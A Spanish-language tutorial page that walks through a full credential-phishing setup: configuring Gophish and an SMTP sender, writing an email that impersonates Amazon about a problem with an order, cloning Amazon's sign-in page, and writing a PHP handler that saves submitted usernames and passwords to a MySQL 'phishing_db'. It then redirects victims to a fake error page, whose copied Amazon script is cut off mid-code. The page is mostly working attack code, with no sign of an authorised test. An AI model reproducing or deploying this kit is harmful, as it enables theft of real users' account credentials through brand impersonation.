---
icon: file-lines
---

# Phishing Técnicas y Resultados

### <mark style="color:purple;">Gophish \[Configuracion]</mark>

Lo primero de todo tendremos que descargar la herramienta de `Gophish` y que cree el servidor donde se aloja la pagina web para poder empezar a configurarla...

URL (Gophish) = https://github.com/gophish/gophish

Por lo que lo descargaremos de la siguiente manera...

```shell
git clone https://github.com/gophish/gophish.git
```

```shell
cd gophish/
```

```shell
go build
```

Una vez instalado todo y construido, lo ejecutaremos de la siguiente manera...

```shell
gophish
```

Cuando se ejecute la aplicacion las credenciales se mostraran en la terminal para que puedas iniciar sesion a parte de que se abrira automaticamente el login, pero en tal caso de que no se abriera nos proporcionara la `URL` para poder ingresarla en internet...

```
level=info msg="Please login with the username admin and the password <PASSWORD>"
```

Sabremos que el usuario sera `admin` y la password cambiara dependiendo del usuario, el link sera el siguiente...

```
URL = https://127.0.0.1:3333/
```

Cuando inicies sesion con las credenciales por defecto, te pedira que cambies la contraseña y una vez hecho eso, nos metera en la pagina para poder empezar a configurarla...

Lo primero que configuraremos sera la parte llamada como `Email Templates` y dentro del mismo crearemos uno nuevo donde pone `[+] New Template` para asi poder crear el `email` que va a ver el usuario cuando se le envie...

En la parte de `Name:` ponemos el nombre que queramos en mi caso le pondre `GMAIL PHISHING`, donde pone `Envelope Sender:` ponemos el `email` que queremos que se vea cuando le llegue al usuario paar que sea todo mas real, donde pone `Subject:` ponemos el titulo o la cabecera del correo que le va a llegar al usuario y por ultimo en la misma parte un poco mas abajo hay 2 opciones llamadas `Text` y `HTML` elegiremos `HTML` para poder programar el correo entero por asi decirlo, os dejo un ejemplo del codigo que programe y como se veria...

> Codigo:

```html
<html>
<head>
	<title></title>
	<style type="text/css">.input_letter {
font-size: 17px;
font-weight: bold;
}

.line {
color: grey;
height: 0.1px;
}

.line_head {
color: orange;
height: 10px;
background-color: orange;
border: none;
margin-top: 0px;
}

.box {
background-color: rgba(220, 220, 220,0.45);
border-radius: 3px;
padding: 10px;
font-size: 12.5px;
color: rgb(130, 130, 130);
}

span.letter {
font-family: Verdana, Geneva, Thaoma, sans-serif;
}

body {
font-family: Verdana, Geneva, Thaoma, sans-serif;
color: black;
}
	</style>
</head>
<body>
<hr class="line_head" />
<p><img src="https://www.sosgats.org/wp-content/uploads/2017/01/logo-amazon.jpg" width="300" /></p>

<hr class="line" />
<p>Estimado/a cliente,<br />
<br />
Lamentamos informarle que ha habido un problema con uno de sus pedidos recientes en Amazon. Para resolver este problema y asegurarnos de que reciba su pedido a tiempo, necesitamos que confirme algunos detalles de su cuenta.<br />
<br />
Si no resuelve este problema, es posible que su pedido se retrase o sea cancelado. Agradecemos su pronta atenci&oacute;n a este asunto.<br />
<br />
Si tiene alguna pregunta o necesita asistencia adiccional, no dude en contactarnos a traves de nuestro servicio de atenci&oacute;n al cliente.<br />
<br />
Atentamente,<br />
<br />
Equipo de Atenci&oacute;n al Cliente Amazon.</p>

<p><a href="{{.URL}}"><input class="input_letter" style="background-color: orange; border: none; border-radius: 3px; padding: 15px 32px;" type="submit" value="Seguimiento de tu pedido" /></a></p>

<div class="box"><span class="letter">Si en el futuro prefieres no recibir correos electr&oacute;nicos de Amazon de este tipo, selecciona la exluci&oacute;n voluntaria <a href="{{.URL}}">aqu&iacute;</a></span><br />
<br />
<span class="letter">Referencia AKDFGD27DKIEHFU6-JDLJDJS423ILFPBNGS Amazon EU Sarl. Luxemburgo, Reg# B-1810102, 5 Rue Plaetis, L-23824 Luxemburgo. VAT # LU 2026781.</span><br />
&nbsp;
<p><img src="https://niveldecalidad.com/wp-content/uploads/2022/09/PAGINA_AMAZON_2-02.png" width="100" /></p>
</div>
</body>
</html>
```

Perspectiva:

<figure><img src="../../.gitbook/assets/email1.png" alt=""><figcaption></figcaption></figure>

Donde pone en el codigo `{{.URL}}` es donde sustituiremos eso por el link que nos proporcionara la herramienta `ngrok` pero eso mas adelante...

Una vez creado el correo lo guardaremos y nos iremos a la seccion de `Sending Profiles` le daremos a crear uno nuevo `[+] New Profile` donde pone `Name:` pondremos el nombre que queramos sera para nosotros identificarlo en mi caso le llamare `PHISHING SMTP`, donde pone `SMTP From:` le pondremos el correo donde esta configurado nuestro servidor `SMTP` o el que viene por defecto en nuestro correo creado de `hotmail`...

> Ejemplo `SMTP From`:

```
SMTP From: example@hotmail.com
```

Donde pone `Host:` pondremos el identificador de nuestro servidor `SMTP` o el por defecto que viene en `Microsoft`...

> Ejemplo `Host`:

```
Host: smtp-mail.outlook.com:587
```

Y por ultimo donde pone `Username` y `Password` pondremos en `Username` lo mismo que metimos en `SMTP From` y en `Password` la contraseña de ese correo...

> Ejemplo `Username` y `Password`:

```
Username: example@hotmail.com

Password: secret123
```

Ahora nos dirigimos a la seccion de `Landing Pages` crearemos una pagina pero que no servira para nada, ya que no la utilizaremos pero la herramienta `Gophish` obliga a tener una, pero mas adelante ya crearemos una pagina en nuestro puerto local de `apache2`...

En mi caso a la pagina la llame `test` en la opcion `Name:` y la guardaremos `[!] Aviso: esta pagina no va a servir para nada, es solo por que la herramienta lo pide`...

Despues nos dirigimos en la parte de `Users & Groups` dentro del mismo crearemos uno donde pone `[+] New Group`, en la parte de `Name:` pondremos un nombre para identificarlo en mi caso lo llame `Example_group`, y en las casillas llamadas...

```
First Name: Example

Last Name: Test

Email: attack@gmail.com

Position: CEO
```

Estas opciones las estamos configurando para que cuando enviemos el correo aparezca con el nombre y apellidos a parte de la posicion laboral que va a ser visible por el usuario si se pusiera a buscar, por lo que lo tendremos que adaptar al tipo de `phishing` que estemos haciendo y por ultimo donde pone `Email:` pondremos el `email` con el que enviaremos el `phishing` (Nuestro `email`)...

Una vez configurado todo lo añadiremos `[+] Add` y lo guardaremos todo...

Ya por ultimo nos vamos a la seccion llamada `Campaigns` y le daremos a `[+] New Campaign` dentro de la configuracion lo configuraremos de la siguiente manera...

Donde pone `Name:` pondremos el nombre con el que lo queramos identificar en mi caso lo llamare `test_phishing`, en la parte de `Email Template:` pondremos el `email` que creamos anteriormente en mi caso lo llame `GMAIL PHISHING`, en la parte de `Landing Page:` pondremos el que llamamos `test`, donde pone `URL:` pondremos para todos lo mismo `http://localhost`, en la parte de `Sending Profile:` pondremos la configuracion del `SMTP` que creamos anteriormente en mi caso llamado `PHISHING SMTP` y por ultimo en la parte de `Groups:` seleccionaremos el grupo anteriormente creado llamado en mi caso `test_group`...

> Como deberia de verse:

<figure><img src="../../.gitbook/assets/campaign1.png" alt=""><figcaption></figcaption></figure>

Una vez puesto todo lo anterior no guardaremos nada, le daremos en la opcion llamada `Send Test Email` y dentro de la misma se configurara de la siguiente forma...

```
First Name: Victim

Last Name: Test

Email: victim@gmail.com

Position: CEO
```

Lo importante de aqui es poner en la parte de `Email:` el `email` del usuario victima al que se lo queremos mandar, pero antes de hacerlo, crearemos la pagina web `phishing` desde nuestra terminal de la siguiente manera y ya retomaremos esta parte del envio...

### Pagina Phishing \[Configuracion apache2, mysql, ngrok, etc...]

Lo primero que haremos sera instalar `apache2`...

```shell
sudo apt install apache2
```

Pero no podremos iniciarlo con `systemctl` ya que por defecto se aloja en el puerto `80` y ese puerto ya esta cogido por un proceso de la herramienta `Gophish` por lo que cambiaremos de puerto a `apache2` de la siguiente forma...

```shell
nano /etc/apache2/ports.conf

#Dentro del nano
Listen <PORT>
```

> Ejemplo (`PORT`):

```
nano /etc/apache2/ports.conf

#Dentro del nano
# If you just change the port or add more ports here, you will likely also
# have to change the VirtualHost statement in
# /etc/apache2/sites-enabled/000-default.conf

Listen 7755

<IfModule ssl_module>
        Listen 443
</IfModule>

<IfModule mod_gnutls.c>
        Listen 443
</IfModule>
```

Lo guardamos y con eso ya habriamos cambiado el puerto del `apache2`, por lo que ahora lo iniciaremos...

```shell
systemctl start apache2
systemctl enable apache2
```

Con esto ya estaria en funcionamiento y establecido cada vez que se arranque el S.O. el `apache2`...

Por lo que nos dirigimos a la siguiente ubicacion para borrar los archivos creados por defecto del `apache2`...

```shell
cd /var/www/html/
```

```shell
rm *
```

o

```shell
rm /var/www/html/*
```

### <mark style="color:purple;">MySQL \[Configuracion de captacion de credenciales]</mark>

Instalaremos y configuraremos una base de datos en `mysql` para que cuando inserte las credenciales en la pagina de `phishing` del login se envien automaticamente a la base de datos que crearemos en `mysql`...

```shell
systemctl start mysqld
systemctl enable mysqld
```

Una vez instalado `mysql` nos meteremos dentro del entorno para crear la base de datos con las credenciales por defecto de `mysql`...

```shell
mysql -u root -p
```

Nos pedira una contraseña, pero lo dejaremos vacio y le daremos a `enter`...

Una vez dentro haremos lo siguiente...

\-- Crear base de datos --

```mysql
CREATE DATABASE phishing_db;
```

\-- Usar la base de datos --

```mysql
USE phishing_db;
```

\-- Crear tabla credentials --

```mysql
CREATE TABLE credentials (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(255) NOT NULL,
    password VARCHAR(255) NOT NULL
);
```

Ahora configuraremos el usuario `root` para que no surja ningun problema a la hora de configurar el `.php` para que se escriban los datos en `mysql`...

\-- Cambiar la contraseña del usuario root --

```mysql
ALTER USER 'root'@'localhost' IDENTIFIED BY 'root';
```

\-- Conceder todos los privilegios al usuario root --

```mysql
GRANT ALL PRIVILEGES ON *.* TO 'root'@'localhost' WITH GRANT OPTION;
```

\-- Actualizar los privilegios --

```mysql
FLUSH PRIVILEGES;
```

Una vez configurado todo saldremos de la base de datos del entorno de `mysql`...

```shell
exit
```

#### Configuracion de la pagina web phishing y captacion de datos en PHP

Nos vamos a la siguiente ubicacion para crear toda la estructura...

```shell
cd /var/www/html
```

> Pagina Web `phishing`:

Lo llamaremos `index.php` para que sea lo primero que se vea cuando le redirija el link...

```php
<!doctype html>

<html class="a-no-js" data-19ax5a9jf="dingo">

  

<head>

    <link rel="icon" href="https://static.vecteezy.com/system/resources/previews/014/018/561/non_2x/amazon-logo-on-transparent-background-free-vector.jpg" type="image/x-icon">

    <title dir="ltr">Iniciar sesión en Amazon</title>

    <link rel="stylesheet" href="https://images-eu.ssl-images-amazon.com/images/I/61A6IErPNXL._RC|11Fd9tJOdtL.css,11tfezETfFL.css,31Q3id-QR0L.css,31U9HrBLKmL.css_.css?AUIClients/AmazonUI#us.not-trident" />

    <link rel="stylesheet" href="https://images-eu.ssl-images-amazon.com/images/I/01SdjaY0ZsL._RC|31jdWD+JB+L.css,51a-Srr-vTL.css_.css?AUIClients/AuthenticationPortalAssets" />

    <link rel="stylesheet" href="https://images-eu.ssl-images-amazon.com/images/I/21N2V6fmOuL.css?AUIClients/CVFAssets" />

</head>

  

<body class="auth-no-skin ap-locale-es_ES a-m-us a-aui_72554-c a-aui_accordion_a11y_role_354025-c a-aui_killswitch_csa_logger_372963-c a-aui_pci_risk_banner_210084-c a-aui_preload_261698-c a-aui_rel_noreferrer_noopener_309527-c a-aui_template_weblab_cache_333406-c a-aui_tnr_v2_180836-c">

    <script>

        window.ue && ue.count && ue.count('CSMLibrarySize', 18524)

    </script>

    <div id="a-page">

        <script type="a-state" data-a-state="{&quot;key&quot;:&quot;a-wlab-states&quot;}">{}</script>

        <div class="a-section a-padding-medium auth-workflow">

            <div class="a-section a-spacing-none auth-navbar">

                <div class="a-section a-spacing-medium a-text-center">

                    <a class="a-link-nav-icon" href="/ref=ap_frn_logo">

                        <i class="a-icon a-icon-logo" role="img" aria-label="Amazon"></i>

                        <i class="a-icon a-icon-domain-es a-icon-domain" role="presentation"></i>

                    </a>

                </div>

            </div>

            <div id="authportal-center-section" class="a-section">

                <div id="authportal-main-section" class="a-section">

                    <div class="a-section a-spacing-base auth-pagelet-container">

                        <div class="a-section auth-pagelet-container">

                            <!-- Establecer variables de SSO de dominio cruzado para hacer llamadas Ajax al dominio central de identidad -->

                            <div class="a-section a-spacing-base">

                                <div class="a-section">

                                    <form name="signIn" method="post" novalidate action="process.php" class="a-spacing-none">

                                        <div class="a-section">

                                            <div class="a-box">

                                                <div class="a-box-inner a-padding-extra-large">

                                                    <h1 class="a-spacing-small">

                                                        Iniciar sesión

                                                    </h1>

                                                    <!-- Elemento opcional de subencabezado -->

                                                    <div class="a-row a-spacing-base">

                                                        <label for="ap_email" class="a-form-label">

                                                            Dirección de e-mail o número de teléfono móvil

                                                        </label>

                                                        <input type="text" maxlength="128" id="username" autocomplete="webauthn" name="username" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field" aria-describedby="Indica tu dirección de e-mail o teléfono móvil" aria-required="true" /><br><br>

                                                        <div id="auth-email-missing-alert" class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini" role="alert">

                                                            <div class="a-box-inner a-alert-container"><i class="a-icon a-icon-alert"></i>

                                                                <div class="a-alert-content">

                                                                    Indica tu dirección de e-mail o teléfono móvil

                                                                </div>

                                                            </div>

                                                        </div>

                                                    </div>

                                                    <input type="hidden" name="create" value="0" />

                                                    <div class="a-section a-spacing-large">

                                                        <div class="a-row">

                                                            <div class="a-column a-span5">

                                                                <label for="ap_password" class="a-form-label">

                                                                    Contraseña

                                                                </label>

                                                            </div>

                                                            <div class="a-column a-span7 a-text-right a-span-last">

                                                                <a id="auth-fpp-link-bottom" class="a-link-normal" href="https://www.amazon.es/ap/forgotpassword?showRememberMe=true&amp;openid.pape.max_auth_age=0&amp;openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;webAuthnChallengeIdForAutofill=n87wpIzpvHZ-RFvxBYUoEw24O1NmT675%3AEU&amp;webAuthnGetParametersForAutofill=eyJycElkIjoiYW1hem9uLmVzIiwiY2hhbGxlbmdlIjoibjg3d3BJenB2SFotUkZ2eEJZVW9FdzI0TzFObVQ2NzUiLCJ0aW1lb3V0Ijo5MDAwMDAsImFsbG93Q3JlZGVudGlhbHMiOm51bGwsIm1lZGlhdGlvbiI6ImNvbmRpdGlvbmFsIiwidXNlclZlcmlmaWNhdGlvbiI6InByZWZlcnJlZCJ9&amp;language=es_ES&amp;pageId=amzn_retail_yourorders_es&amp;openid.return_to=https%3A%2F%2Fwww.amazon.es%2Fyour-orders%2Forders%3Fref_%3Dya_d_c_yo&amp;prevRID=J8GEN1NJCTYY482HY48D&amp;openid.assoc_handle=amzn_retail_yourorders_es&amp;openid.mode=checkid_setup&amp;prepopulatedLoginId=&amp;failedSignInCount=0&amp;openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0">

                                                                    ¿Has olvidado la contraseña?

                                                                </a>

                                                            </div>

                                                        </div>

                                                        <input type="password" maxlength="1024" id="password" autocomplete="current-password" name="password" tabindex="2" class="a-input-text a-span12 auth-required-field" aria-describedby="Introduce tu contraseña" aria-required="true" /><br><br>

                                                        <div id="auth-password-missing-alert" class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini" role="alert">

                                                            <div class="a-box-inner a-alert-container"><i class="a-icon a-icon-alert"></i>

                                                                <div class="a-alert-content">

                                                                    Introduce tu contraseña

                                                                </div>

                                                            </div>

                                                        </div>

                                                    </div>

                                                    <div class="a-section a-spacing-extra-large">

                                                        <span class="a-button a-button-span12 a-button-primary auth-disable-button-on-submit"><span class="a-button-inner"><input id="signInSubmit" tabindex="5" class="a-button-input" type="submit" /><span class="a-button-text" aria-hidden="true">

                                                                    Iniciar sesión

                                                                </span></span></span>

                                                        <div id="legalTextRow" class="a-row a-spacing-top-medium a-size-small">

                                                            Al continuar, aceptas las <a href="/gp/help/customer/display.html/ref=ap_signin_notification_condition_of_use?ie=UTF8&amp;nodeId=200545940">Condiciones de uso y venta</a> de Amazon. Consulta nuestro <a href="/gp/help/customer/display.html/ref=ap_signin_notification_privacy_notice?ie=UTF8&amp;nodeId=200545460">Aviso de privacidad</a>, nuestro <a href="/gp/help/customer/display.html/?nodeId=201890250">Aviso sobre cookies</a> y nuestro <a href="/gp/help/customer/display.html?nodeId=201909150">Aviso sobre anuncios basados en intereses</a>.

                                                        </div>

                                                        <script>

                                                            function cf() {

                                                                if (typeof window.uet === 'function') {

                                                                    uet('cf');

                                                                }

                                                                if (window.embedNotification &&

                                                                    typeof window.embedNotification.onCF === 'function') {

                                                                    embedNotification.onCF();

                                                                }

                                                            }

                                                        </script>

                                                        <script type="text/javascript">

                                                            cf()

                                                        </script>

                                                        <div class="a-row a-spacing-top-medium">

                                                            <div class="a-section a-text-left">

                                                                <label for="auth-remember-me" class="a-form-label">

                                                                    <div data-a-input-name="rememberMe" class="a-checkbox"><label><input type="checkbox" name="rememberMe" value="true" /><i class="a-icon a-icon-checkbox"></i><span class="a-label a-checkbox-label">

                                                                                Recuérdame.

                                                                                <span class="a-declarative" data-action="a-popover" data-csa-c-type="widget" data-csa-c-func-deps="aui-da-a-popover" data-a-popover="{&quot;closeButtonLabel&quot;:&quot;Cerrar&quot;,&quot;activate&quot;:&quot;onclick&quot;,&quot;header&quot;:&quot;Casilla \&quot;Recuérdame\&quot;&quot;,&quot;inlineContent&quot;:&quot;\u003cp&gt;Si seleccionas \&quot;Recuérdame\&quot;, se reduce el número de veces que se te pedirá que te identifiques en este dispositivo.\u003c\/p&gt;\n\u003cp&gt;Para mantener la seguridad de tu cuenta, utiliza esta opción sólo en tus dispositivos personales.\u003c\/p&gt;&quot;}">

                                                                                    <a id="remember_me_learn_more_link" href="javascript:void(0)" role="button" class="a-popover-trigger a-declarative">

                                                                                        Detalles

                                                                                        <i class="a-icon a-icon-popover"></i></a>

                                                                                </span>

                                                                            </span></label></div>

                                                                </label>

                                                            </div>

                                                        </div>

                                                    </div>

                                                    <div class="a-divider a-divider-break">

                                                        <h5 aria-level="5">¿Eres nuevo en Amazon?</h5>

                                                    </div>

                                                    <span id="auth-create-account-link" class="a-button a-button-span12 a-button-base"><span class="a-button-inner"><a id="createAccountSubmit" href="https://www.amazon.es/ap/register?showRememberMe=true&amp;openid.pape.max_auth_age=0&amp;openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;webAuthnChallengeIdForAutofill=n87wpIzpvHZ-RFvxBYUoEw24O1NmT675%3AEU&amp;webAuthnGetParametersForAutofill=eyJycElkIjoiYW1hem9uLmVzIiwiY2hhbGxlbmdlIjoibjg3d3BJenB2SFotUkZ2eEJZVW9FdzI0TzFObVQ2NzUiLCJ0aW1lb3V0Ijo5MDAwMDAsImFsbG93Q3JlZGVudGlhbHMiOm51bGwsIm1lZGlhdGlvbiI6ImNvbmRpdGlvbmFsIiwidXNlclZlcmlmaWNhdGlvbiI6InByZWZlcnJlZCJ9&amp;language=es_ES&amp;pageId=amzn_retail_yourorders_es&amp;openid.return_to=https%3A%2F%2Fwww.amazon.es%2Fyour-orders%2Forders%3Fref_%3Dya_d_c_yo&amp;prevRID=J8GEN1NJCTYY482HY48D&amp;openid.assoc_handle=amzn_retail_yourorders_es&amp;openid.mode=checkid_setup&amp;prepopulatedLoginId=&amp;failedSignInCount=0&amp;openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0" class="a-button-text">

                                                                Crea tu cuenta de Amazon

                                                            </a></span></span>

                                                </div>

                                            </div>

                                        </div>

                                    </form>

                                </div>

                            </div>

                        </div>

                    </div>

                </div>

                <div id="right-2">

                </div>

                <div class="a-section a-spacing-top-extra-large auth-footer">

                    <div class="a-divider a-divider-section">

                        <div class="a-divider-inner"></div>

                    </div>

                    <div class="a-section a-spacing-small a-text-center a-size-mini">

                        <span class="auth-footer-seperator"></span>

  

                        <ul>

                            <li style="list-style-type: none; margin: 0; padding:0; display: inline-block;">

                                <a class="a-link-normal a-nowrap" target="_blank" rel="noopener" href="/gp/help/customer/display.html/ref=ap_desktop_footer_cou?ie=UTF8&amp;nodeId=200545940">

                                    Condiciones de uso

                                </a>

                                <span class="auth-footer-seperator"></span>

                            </li>

                            <li style="list-style-type: none; margin: 0; padding:0; display: inline-block;">

                                <a class="a-link-normal a-nowrap" target="_blank" rel="noopener" href="/gp/help/customer/display.html/ref=ap_desktop_footer_privacy_notice?ie=UTF8&amp;nodeId=200545460">

                                    Aviso de privacidad

                                </a>

                                <span class="auth-footer-seperator"></span>

                            </li>

                            <li style="list-style-type: none; margin: 0; padding:0; display: inline-block;">

                                <a class="a-link-normal a-nowrap" target="_blank" rel="noopener" href="/help">

                                    Ayuda

                                </a>

                                <span class="auth-footer-seperator"></span>

                            </li>

                            <li style="list-style-type: none; margin: 0; padding:0; display: inline-block;">

                                <a class="a-link-normal a-nowrap" target="_blank" rel="noopener" href="/gp/help/customer/display.html/?nodeId=201890250">

                                    Cookies

                                </a>

                                <span class="auth-footer-seperator"></span>

                            </li>

                            <li style="list-style-type: none; margin: 0; padding:0; display: inline-block;">

                                <a class="a-link-normal a-nowrap" target="_blank" rel="noopener" href="/gp/help/customer/display.html/?nodeId=201909150">

                                    Publicidad basada en intereses

                                </a>

                                <span class="auth-footer-seperator"></span>

                            </li>

                        </ul>

                    </div>

                    <div class="a-section a-spacing-none a-text-center">

                        <span class="a-size-mini a-color-secondary">

                            © 1996-2024, Amazon.com, Inc. o sus afiliados

                        </span>

                    </div>

                </div>

            </div>

            <div id="auth-external-javascript" class="auth-external-javascript" data-external-javascripts="">

            </div>

            <noscript>

                <img height="1" width="1" style='display:none;visibility:hidden;' src='//fls-eu.amazon.com/1/batch/1/OP/A1RKKUPIHCS9HS:258-2815425-3127959:J8GEN1NJCTYY482HY48D$uedata=s:%2Fap%2Fuedata%3Fnoscript%26id%3DJ8GEN1NJCTYY482HY48D:0' alt="" />

            </noscript>

            <script>

                window.ue && ue.count && ue.count('CSMLibrarySize', 48885)

            </script>

        </div>

    </div>

</body>

  

</html>
```

Perspectiva:

<figure><img src="../../.gitbook/assets/login1.png" alt=""><figcaption></figcaption></figure>

Una vez tengamos creado el login y el formulario con el `action="process.php"` que le programamos para que cuando inicies sesion redirija a ese `process.php` que ahora crearemos, crearemos el `process.php` el cual sera el que capte las credenciales y las escriba en `mysql` a parte de que te redirija a la vez a una pagina de error de la siguiente forma...

> process.php

```php
<?php

// Configuración de la base de datos

$servername = "localhost";

$db_username = "root";

$db_password = "root";  // Contraseña actualizada

$dbname = "phishing_db";

  

// Crear conexión

$conn = new mysqli($servername, $db_username, $db_password, $dbname);

  

// Verificar conexión

if ($conn->connect_error) {

    die("Conexión fallida: " . $conn->connect_error);

}

  

// Obtener las credenciales del formulario

$user = $_POST['username'];

$pass = $_POST['password'];

  

// Validar que los datos no estén vacíos

if (empty($user) || empty($pass)) {

    die("Usuario o contraseña no proporcionados.");

}

  

// Preparar y ejecutar la consulta

$stmt = $conn->prepare("INSERT INTO credentials (username, password) VALUES (?, ?)");

if ($stmt === false) {

    die("Preparación de consulta fallida: " . $conn->error);

}

  

$stmt->bind_param("ss", $user, $pass);

if (!$stmt->execute()) {

    die("Ejecución de consulta fallida: " . $stmt->error);

}

  

// Cerrar la declaración y la conexión

$stmt->close();

$conn->close();

  

// Redirigir a una página de error falso o una página legítima

header("Location: index_error.php");  // Cambia esta URL a una URL de error o de redirección legítima

exit();

?>
```

Aqui configuramos ya el archivo con la base de datos en `mysql` para que se escriba en esa base de datos de esa tabla metiendose con el usuario `root` con la contraseña `root` y que te redirija al archivo `index_error.php` el cual crearemos ahora mismo...

> index\_error.php

```php
<!DOCTYPE html>

<head>
    <link rel="icon" href="https://static.vecteezy.com/system/resources/previews/014/018/561/non_2x/amazon-logo-on-transparent-background-free-vector.jpg" type="image/x-icon">
    <script type='text/javascript'>
        var ue_t0 = ue_t0 || +new Date();
    </script>
    <script type='text/javascript'>
        window.ue_ihb = (window.ue_ihb || window.ueinit || 0) + 1;
        if (window.ue_ihb === 1) {

            var ue_csm = window,
                ue_hob = +new Date();
            (function(d) {
                var e = d.ue = d.ue || {},
                    f = Date.now || function() {
                        return +new Date
                    };
                e.d = function(b) {
                    return f() - (b ? 0 : d.ue_t0)
                };
                e.stub = function(b, a) {
                    if (!b[a]) {
                        var c = [];
                        b[a] = function() {
                            c.push([c.slice.call(arguments), e.d(), d.ue_id])
                        };
                        b[a].replay = function(b) {
                            for (var a; a = c.shift();) b(a[0], a[1], a[2])
                        };
                        b[a].isStub = 1
                    }
                };
                e.exec = function(b, a) {
                    return function() {
                        try {
                            return b.apply(this, arguments)
                        } catch (c) {
                            ueLogError(c, {
                                attribution: a || "undefined",
                                logLevel: "WARN"
                            })
                        }
                    }
                }
            })(ue_csm);


            var ue_err_chan = 'jserr-rw';
            (function(d, e) {
                function h(f, b) {
                    if (!(a.ec > a.mxe) && f) {
                        a.ter.push(f);
                        b = b || {};
                        var c = f.logLevel || b.logLevel;
                        c && c !== k && c !== m && c !== n && c !== p || a.ec++;
                        c && c != k || a.ecf++;
                        b.pageURL = "" + (e.location ? e.location.href : "");
                        b.logLevel = c;
                        b.attribution = f.attribution || b.attribution;
                        a.erl.push({
                            ex: f,
                            info: b
                        })
                    }
                }

                function l(a, b, c, e, g) {
                    d.ueLogError({
                        m: a,
                        f: b,
                        l: c,
                        c: "" + e,
                        err: g,
                        fromOnError: 1,
                        args: arguments
                    }, g ? {
                        attribution: g.attribution,
                        logLevel: g.logLevel
                    } : void 0);
                    return !1
                }
                var k = "FATAL",
                    m = "ERROR",
                    n = "WARN",
                    p = "DOWNGRADED",
                    a = {
                        ec: 0,
                        ecf: 0,
                        pec: 0,
                        ts: 0,
                        erl: [],
                        ter: [],
                        buffer: [],
                        mxe: 50,
                        startTimer: function() {
                            a.ts++;
                            setInterval(function() {
                                d.ue && a.pec < a.ec && d.uex("at");
                                a.pec = a.ec
                            }, 1E4)
                        }
                    };
                l.skipTrace = 1;
                h.skipTrace = 1;
                h.isStub = 1;
                d.ueLogError = h;
                d.ue_err = a;
                e.onerror = l
            })(ue_csm, window);


            var ue_id = 'KE82YVBED2PEDHPE6KTZ',
                ue_url = '/ap/uedata',
                ue_navtiming = 1,
                ue_mid = 'A1RKKUPIHCS9HS',
                ue_sid = '260-7076577-0538233',
                ue_sn = 'www.amazon.es',
                ue_furl = 'fls-eu.amazon.com',
                ue_surl = 'https://unagi-eu.amazon.com/1/events/com.amazon.csm.nexusclient.prod',
                ue_int = 0,
                ue_fcsn = 1,
                ue_urt = 3,
                ue_rpl_ns = 'cel-rpl',
                ue_ddq = 1,
                ue_fpf = '//fls-eu.amazon.com/1/batch/1/OP/A1RKKUPIHCS9HS:260-7076577-0538233:KE82YVBED2PEDHPE6KTZ$uedata=s:',
                ue_sbuimp = 1,
                ue_ibft = 0,
                ue_sswmts = 0,
                ue_jsmtf = 0,
                ue_fnt = 0,
                ue_lpsi = 6000,
                ue_no_counters = 0,
                ue_lob = '0',
                ue_sjslob = 0,

                ue_swi = 1;
            var ue_viz = function() {
                (function(b, f, d) {
                    function g() {
                        return (!(p in d) || 0 < d[p]) && (!(q in d) || 0 < d[q])
                    }

                    function h(c) {
                        if (b.ue.viz.length < w && !r) {
                            var a = c.type;
                            c = c.originalEvent;
                            /^focus./.test(a) && c && (c.toElement || c.fromElement || c.relatedTarget) || (a = g() ? f[s] || ("blur" == a || "focusout" == a ? t : u) : t, b.ue.viz.push(a + ":" + (+new Date - b.ue.t0)), a == u && (b.ue.isl && x("at"), r = 1))
                        }
                    }
                    for (var r = 0, x = b.uex, a, k, l, s, v = ["", "webkit", "o", "ms", "moz"], e = 0, m = 1, u = "visible", t = "hidden", p = "innerWidth", q = "innerHeight", w = 20, n = 0; n < v.length && !e; n++)
                        if (a =
                            v[n], k = (a ? a + "H" : "h") + "idden", e = "boolean" == typeof f[k]) l = a + "visibilitychange", s = (a ? a + "V" : "v") + "isibilityState";
                    h({});
                    e && f.addEventListener(l, h, 0);
                    m = g() ? 1 : 0;
                    d.addEventListener("resize", function() {
                        var a = g() ? 1 : 0;
                        m !== a && (m = a, h({}))
                    }, {
                        passive: !0
                    });
                    b.ue && e && (b.ue.pageViz = {
                        event: l,
                        propHid: k
                    })
                })(ue_csm, ue_csm.document, ue_csm.window)
            };

            (function(d, h, N) {
                function H(a) {
                    return a && a.replace && a.replace(/^\s+|\s+$/g, "")
                }

                function u(a) {
                    return "undefined" === typeof a
                }

                function B(a, b) {
                    for (var c in b) b[v](c) && (a[c] = b[c])
                }

                function I(a) {
                    try {
                        var b = N.cookie.match(RegExp("(^| )" + a + "=([^;]+)"));
                        if (b) return b[2].trim()
                    } catch (c) {}
                }

                function O(k, b, c) {
                    var q = (x || {}).type;
                    if ("device" !== c || 2 !== q && 1 !== q) k && (d.ue_id = a.id = a.rid = k, w && (w = w.replace(/((.*?:){2})(\w+)/, function(a, b) {
                        return b + k
                    })), D && (e("id", D, k), D = 0)), b && (w && (w = w.replace(/(.*?:)(\w|-)+/, function(a,
                        c) {
                        return c + b
                    })), d.ue_sid = b), c && a.tag("page-source:" + c), d.ue_fpf = w
                }

                function P() {
                    var a = {};
                    return function(b) {
                        b && (a[b] = 1);
                        b = [];
                        for (var c in a) a[v](c) && b.push(c);
                        return b
                    }
                }

                function y(d, b, c, q) {
                    q = q || +new E;
                    var g, m;
                    if (b || u(c)) {
                        if (d)
                            for (m in g = b ? e("t", b) || e("t", b, {}) : a.t, g[d] = q, c) c[v](m) && e(m, b, c[m]);
                        return q
                    }
                }

                function e(d, b, c) {
                    var e = b && b != a.id ? a.sc[b] : a;
                    e || (e = a.sc[b] = {});
                    "id" === d && c && (Q = 1);
                    return e[d] = c || e[d]
                }

                function R(d, b, c, e, g) {
                    c = "on" + c;
                    var m = b[c];
                    "function" === typeof m ? d && (a.h[d] = m) : m = function() {};
                    b[c] =
                        function(a) {
                            g ? (e(a), m(a)) : (m(a), e(a))
                        };
